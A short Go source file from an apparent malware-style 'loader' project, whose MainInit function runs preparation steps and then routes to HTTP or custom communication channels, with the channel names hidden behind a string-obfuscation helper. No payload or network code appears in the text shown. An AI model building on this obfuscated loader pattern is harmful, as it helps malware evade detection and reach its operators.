package routine

import (
	"loader/utils/actions"
	global "loader/utils"
	"loader/utils/obf"
)

// MainInit — nim loader: main_init (canais http e custom, igual ao loader linux).
func MainInit() {
	// Main function that prepares the loader and routes to the channel
	actions.MainPreparations()
	switch global.Channel {
	case obf.S("http"):
		HTTPMain()
	case obf.S("custom"):
		CustomMain()
	}
}
